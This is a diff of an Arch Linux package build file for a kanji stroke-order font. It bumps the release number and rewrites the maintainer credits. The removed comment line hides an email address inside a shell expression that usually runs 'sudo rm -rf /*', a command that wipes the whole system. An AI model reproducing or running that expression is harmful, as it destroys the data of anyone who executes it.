@@ -1,11 +1,11 @@
-# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
+# Contributor: felix
 # Contributor: Tushar R <echo dHVzaGFyXzcyN0B5YWhvby5jb20K | base64 -d>
 # Contributor: Bernhard Tittelbach <xro -at- realraum -dot- at>
 # Maintainer: Emil VATAI (vatai) <emil.vatai@gmail.com>
 
 pkgname=ttf-kanjistrokeorders
 pkgver=4.002
-pkgrel=1
+pkgrel=2
 pkgdesc="Kanji stroke order font"
 arch=('any')
 license=('custom')
